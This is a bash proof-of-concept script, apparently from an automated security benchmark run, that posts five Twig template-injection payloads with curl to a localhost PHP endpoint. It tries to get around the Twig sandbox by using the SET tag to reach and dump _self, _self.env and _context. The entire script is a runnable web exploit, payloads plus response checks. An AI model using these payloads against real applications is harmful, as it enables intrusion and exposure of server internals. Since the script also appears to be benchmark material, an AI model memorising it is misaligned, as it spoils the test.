#!/bin/bash
# POC: Demonstrates Twig sandbox bypass via unrestricted SET tag allowing variable assignment to bypass object access controls
# Target: ./repo
# Created: 2025-12-02T16:30:08.036Z
# Session: benchmark-XBEN-092-24-miorxl1g

# Twig Sandbox Bypass via Unrestricted SET Tag
# This POC demonstrates how the SET tag can be used to create variables
# that bypass sandbox object access restrictions

TARGET_URL="http://localhost:8080"
ENDPOINT="/app/index.php"

echo "[*] Testing Twig Sandbox Bypass via SET Tag"
echo "[*] Target: ${TARGET_URL}${ENDPOINT}"
echo ""

# Test 1: Basic SET tag variable assignment (baseline)
echo "[TEST 1] Basic SET tag variable assignment"
PAYLOAD="{% set myvar = 'test' %}{{ myvar }}"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "username=${PAYLOAD}" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE" | grep -q "test"; then
    echo "[+] SET tag works - variable assignment successful"
else
    echo "[-] SET tag did not work as expected"
fi
echo ""

# Test 2: Attempt to access _self via SET tag
echo "[TEST 2] Accessing _self object via SET tag"
PAYLOAD="{% set myenv = _self %}{{ myenv }}"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "username=${PAYLOAD}" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE" | grep -qi "CustomTemplate\|Template"; then
    echo "[+] Successfully created variable holding _self object"
    echo "$RESPONSE"
else
    echo "[-] Could not access _self via SET tag"
    echo "Response: $RESPONSE"
fi
echo ""

# Test 3: Attempt to access environment via SET tag
echo "[TEST 3] Accessing environment object via SET tag"
PAYLOAD="{% set myenv = _self.env %}{{ dump(myenv) }}"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "username=${PAYLOAD}" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE" | grep -qi "Twig\|Environment\|globals"; then
    echo "[+] Successfully created variable holding environment object"
    echo "$RESPONSE"
else
    echo "[-] Could not access _self.env via SET tag"
    echo "Response: $RESPONSE"
fi
echo ""

# Test 4: Create unrestricted copy via SET assignment
echo "[TEST 4] Creating unrestricted object reference via SET"
PAYLOAD="{% set obj = _context %}{{ dump(obj) }}"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "username=${PAYLOAD}" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE" | grep -qi "Array\|username\|context"; then
    echo "[+] Successfully created variable holding _context object"
    echo "$RESPONSE"
else
    echo "[-] Could not access _context via SET tag"
    echo "Response: $RESPONSE"
fi
echo ""

# Test 5: Chain SET and dump to bypass restrictions
echo "[TEST 5] Chaining SET and dump for sandbox bypass"
PAYLOAD="{% set x = _self %}{% set y = x.env %}{{ dump(y) }}"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -d "username=${PAYLOAD}" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE" | grep -qi "Twig\|Environment"; then
    echo "[+] SET chain bypass successful - environment object accessed"
    echo "$RESPONSE"
else
    echo "[-] SET chain bypass did not work"
    echo "Response: $RESPONSE"
fi
echo ""

echo "[*] POC Execution Complete"